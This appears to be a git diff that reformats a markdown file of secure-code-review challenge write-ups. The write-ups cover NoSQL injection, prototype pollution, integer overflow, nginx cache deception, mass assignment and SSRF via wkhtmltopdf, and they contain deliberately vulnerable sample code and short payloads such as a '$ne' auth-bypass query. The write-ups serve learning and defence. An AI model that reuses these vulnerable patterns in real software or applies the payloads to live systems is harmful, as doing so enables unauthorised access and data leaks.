-  - The map is passed directly to FindOne as the query
-  - MongoDB treats the map as a query doc not as data
+    - The map is passed directly to FindOne as the query
+    - MongoDB treats the map as a query doc not as data
 - This means the attacker controls the query logic, not just the values
   This is a problem because MongoDB queries are JSON-based and support operators like
 - \$ne
@@ -1758,7 +1844,7 @@ if users.FindOne(context.TODO(), creds).Err() != nil {
       "username": { "$ne": null },
       "password": { "$ne": null }
     }
-````
+```
 
 - This is read as: find a document where `username != null` and `password != null` allowing for an auth bypass since every user document matches
 
@@ -1766,7 +1852,7 @@ if users.FindOne(context.TODO(), creds).Err() != nil {
 <section>
 ## Challenge 26
 
-``` js
+```js
 const express = require("express");
 const bodyParser = require("body-parser");
 const cookieParser = require("cookie-parser");
@@ -1777,7 +1863,7 @@ app.use(cookieParser());
 
 // Assume that this is a fully-grown database
 let users = {
-    guest: { password: "guest", profile: "My cool profile" }
+    guest: { password: "guest", profile: "My cool profile" },
 };
 
 function merge(target, source) {
@@ -1819,11 +1905,11 @@ app.listen(3000, () => console.log("Server running on port 3000"));
 
 The function `merge()` doesn't validate that we are not using risky JS keywords that allow us to redefine the global object prototype. The general idea and primary idea is that we shouldn't be allowing for merge to take in untrusted user data but on top of that we should have prototype keywords otherwise we need to include filter:
 
-``` js
+```js
 function safeMerge(target, source) {
     for (let key in source) {
         if (key !== "__proto__" && key !== "constructor" && key !== "prototype") {
-            target[key] = source[key]; 
+            target[key] = source[key];
         }
     }
 ```
@@ -1835,13 +1921,14 @@ We can use the merge function to also directly give ourselves admin `{"isAdmin":
 What is merge()? It's a utility function that allows for copying of fields from one object into another. Which means we can generally update an existing JS object with new values
 
 something like this: `merge(user, { profile: "Updated bio" });`
+
 - which adds `user.profile = "Updated bio";` to user
 
 </section>
 <section>
 ## Challenge 27
 
-``` c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -1861,7 +1948,7 @@ int main(void) {
         puts("Error: Quantity must be a positive number.");
         return 1;
     }
-    
+
     unsigned int quantity = (unsigned int) strtoul(input, NULL, 10);
     if (quantity == 0) {
         puts("Error: Quantity must be greater than 0.");
@@ -1869,7 +1956,7 @@ int main(void) {
     }
 
     unsigned int total_u = quantity * (unsigned int) FIXED_PRICE;
-    int total_s = (int) total_u; 
+    int total_s = (int) total_u;
 
     printf("Your entered quantity: %u\n", quantity);
     printf("Fixed price per item is: %d euro\n", FIXED_PRICE);
@@ -1907,7 +1994,7 @@ events {
             location ~* \.(css|js|jpg|png|gif)$ {
                 proxy_pass http://express-app:5000;
                 expires 30d;
-                proxy_cache STATIC;  
+                proxy_cache STATIC;
                 proxy_cache_valid 200 1h;
                 proxy_cache_valid any 5m;
                 proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
@@ -1928,17 +2015,20 @@ events {
 The primary issue in this case is the fact we are actually caching a webpage which isn't static and contains sensitive data which allows threat actors to use that to leak data. A simple fix would simply be to not use web caches in this case, on top of that we can limit what actually gets cached
 
 Before we talk more about bugs what actually is the nginx caching?
+
 - It is a reverse-proxy response cache
 - This sits in front of your application and decides
+
 1. Should this request be forwarded to the backend?
 2. Or can nginx serve a previously cached response instead?
-Nginx will cache HTTP responses
+   Nginx will cache HTTP responses
+
 - request methods
 - scheme
 - Host
 - URI
 
-``` js
+```js
 app.get("/profile*", (req, res) => {
     if (!req.session.user) {
         return res.redirect("/login");
@@ -1955,7 +2045,7 @@ app.get("/profile*", (req, res) => {
 - req.session.user is evaluated per request
 - responses are user-specific and private
 
-``` nginx
+```nginx
 proxy_cache my_cache;
 proxy_cache_key "$scheme$request_method$host$request_uri";
 ```
@@ -1972,7 +2062,7 @@ proxy_cache_key "$scheme$request_method$host$request_uri";
 <section>
 ## Challenge 29
 
-``` python
+```python
 from flask import Flask, request, jsonify
 from flask_sqlalchemy import SQLAlchemy
 import os
@@ -2015,7 +2105,7 @@ def list_invoices():
 @app.route("/pay/<int:invoice_id>", methods=["POST"])
 def mark_invoice_paid(invoice_id):
     invoice = Invoice.query.get_or_404(invoice_id)
-    
+
     # Imagine some proper payment logic here that allows you paying the invoice and, if successful, sets "paid" to "true"
     invoice.paid = True
     db.session.commit()
@@ -2039,19 +2129,21 @@ invoice = Invoice(**data)
 
 It will convert every key the client sends in JSON and uses it to set fields on the `Invoice` model, this model included fields that directly relate to the security of the system like the following:
 `paid = db.Column(db.Boolean, nullable=False, default=False)`
+
 - This means if we just include `"paid": true` in the POST body and create an invoice that is already marked paid bypassing whatever payment logic we intended to enforce in `/pay/id`
 
 ### Bug 2
 
 The `/pay/<invoice_id>` endpoint also marks invoices paid with no verification
+
 - `invoice.paid = True`
-This allows users to pay invoices they don't own, there is no validation regarding ownership of the invoice
+  This allows users to pay invoices they don't own, there is no validation regarding ownership of the invoice
 
 </section>
 <section>
 ## Challenge 30
 
-``` go
+```go
 package main
 
 import (
@@ -2105,15 +2197,15 @@ func main() {
 The bug that exists here is caused by the fact our endpoint takes untrusted HTML input and uses it directly in `wkhtmltopdf` (an HTML to PDF renderer).
 This allows for server-side injection:
 
-``` go
+```go
 html := fmt.Sprintf(`... %s ...`, req.Content)
 pdfg.AddPage(wkhtmltopdf.NewPageReader(bytes.NewReader([]byte(html))))
 ```
 
 - This can fetch and embed references to source such as
-  - `<img src="...">`
-  - `<link rel="stylesheet" href="...">`
-  - `<script src="...">`
-  - `<iframe src="...">`
-    This can be pivoted to showcase a webpage that the user shouldn't see or local files access.
-</section>
+    - `<img src="...">`
+    - `<link rel="stylesheet" href="...">`
+    - `<script src="...">`
+    - `<iframe src="...">`
+      This can be pivoted to showcase a webpage that the user shouldn't see or local files access.
+        </section>
